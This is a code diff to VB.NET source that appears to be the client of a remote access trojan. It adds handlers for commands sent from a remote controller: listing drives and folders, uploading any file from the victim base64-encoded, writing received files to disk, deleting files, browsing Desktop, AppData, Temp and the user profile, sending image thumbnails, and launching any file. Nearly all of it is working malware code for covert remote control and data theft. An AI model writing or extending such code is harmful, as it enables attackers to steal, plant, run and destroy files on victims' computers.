@@ -108,16 +108,78 @@ cc:
             Select Case A(0)
                 Case "Drivers"
                     Send("FM" & SPL & HWID & SPL & FMDrives())
+                    Exit Select
+
                 Case "FM"
+                    Send("FM" & SPL & HWID & SPL & FMFolders(A(1)) & FMFiles(A(1)))
+
+
+                Case "DW"
+                    If IO.File.Exists(A(1)) Then
+                        Send("DW" + SPL + HWID + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) + SPL + IO.Path.GetFileName(A(1)))
+                    End If
+                    Exit Select
+
+                Case "UP"
+                    IO.File.WriteAllBytes(A(1), GZip(SB(A(2)), False))
+                    Send("UP" + SPL + HWID + SPL + IO.Path.GetFileName(A(1)))
+                    Exit Select
+
+                Case "DEL"
+                    If IO.File.Exists(A(1)) Then
+                        IO.File.Delete(A(1))
+                        Send("DEL" + SPL + HWID)
+                    End If
+                    Exit Select
+
+                Case "GOTO"
+                    Select Case A(1)
+                        Case "Desktop"
+                            Send("FM" & SPL & HWID & SPL & FMFolders(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)) & FMFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)) & SPL & Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
+                            Exit Select
+
+                        Case "AppData"
+                            Send("FM" & SPL & HWID & SPL & FMFolders(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) & FMFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) & SPL & Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))
+                            Exit Select
+
+                        Case "Temp"
+                            Send("FM" & SPL & HWID & SPL & FMFolders(Environ("Temp")) & FMFiles(Environ("Temp")) & SPL & Environ("Temp"))
+                            Exit Select
+
+                        Case "User"
+                            Send("FM" & SPL & HWID & SPL & FMFolders(Environ("UserProfile")) & FMFiles(Environ("UserProfile")) & SPL & Environ("UserProfile"))
+                            Exit Select
+                    End Select
+
+                Case "PRE"
                     Try
-                        Send("FM" & SPL & HWID & SPL & FMFolders(A(1)) & FMFiles(A(1)))
-                    Catch ex1 As Exception
-                        Send("FM" & SPL & HWID & SPL & "Error " + SPL + ex1.Message)
+                        Dim MM As New IO.MemoryStream
+                        Dim BM As New Drawing.Bitmap(A(1))
+                        Dim TUMB As New Drawing.Bitmap(250, 250)
+                        Dim G As Drawing.Graphics = Drawing.Graphics.FromImage(TUMB)
+                        G.InterpolationMode = Drawing.Drawing2D.InterpolationMode.Bicubic
+                        G.DrawImage(BM, New Drawing.Rectangle(0, 0, 250, 250), New Drawing.Rectangle(0, 0, BM.Width, BM.Height), Drawing.GraphicsUnit.Pixel)
+                        G.Dispose()
+                        BM.Dispose()
+                        TUMB.Save(MM, System.Drawing.Imaging.ImageFormat.Jpeg)
+                        Send("PRE" & SPL & HWID & SPL & BS(MM.ToArray))
+                        MM.Dispose()
+                        TUMB.Dispose()
+                    Catch ex As Exception
                     End Try
+                    Exit Select
+
+                Case "RUN"
+                    If IO.File.Exists(A(1)) Then
+                        Process.Start(A(1))
+                    End If
+                    Exit Select
+
                 Case "Close"
                     CloseMe()
             End Select
         Catch ex As Exception
+            Send("FM" & SPL & HWID & SPL & "Error " + SPL + ex.Message)
         End Try
 
     End Sub
@@ -230,6 +292,33 @@ cc:
             Return decrypted
         Catch ex As Exception
         End Try
+    End Function
+
+    Public Shared Function GZip(ByVal B As Byte(), ByRef CM As Boolean) As Byte()
+        If CM Then
+            Dim MS As New IO.MemoryStream
+            Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Compress, True)
+            Ziped.Write(B, 0, B.Length)
+            Ziped.Dispose()
+            MS.Position = 0
+            Dim buffer As Byte() = New Byte((CInt(MS.Length) + 1) - 1) {}
+            MS.Read(buffer, 0, buffer.Length)
+            MS.Dispose()
+            Return buffer
+        Else
+            Dim MS As New IO.MemoryStream(B)
+            Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Decompress)
+            Dim buffer As Byte() = New Byte(4 - 1) {}
+            MS.Position = (MS.Length - 5)
+            MS.Read(buffer, 0, 4)
+            Dim count As Integer = BitConverter.ToInt32(buffer, 0)
+            MS.Position = 0
+            Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
+            Ziped.Read(array, 0, count)
+            Ziped.Dispose()
+            MS.Dispose()
+            Return array
+        End If
     End Function
 
     Public Shared C As TcpClient = Nothing
